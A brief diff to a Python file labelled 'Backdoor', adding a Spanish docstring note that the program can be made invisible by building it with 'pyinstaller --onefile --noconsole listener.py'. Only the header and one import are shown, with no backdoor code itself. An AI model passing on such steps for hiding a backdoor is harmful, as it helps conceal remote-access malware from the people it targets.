@@ -1,6 +1,11 @@
 # /usr/bin/env python3
 """
 Backdoor
+
+Para hacerlo invisible se puede usar pyinstaller con la opción --noconsole
+
+pyinstaller --onefile --noconsole listener.py
+
 """
 
 import signal
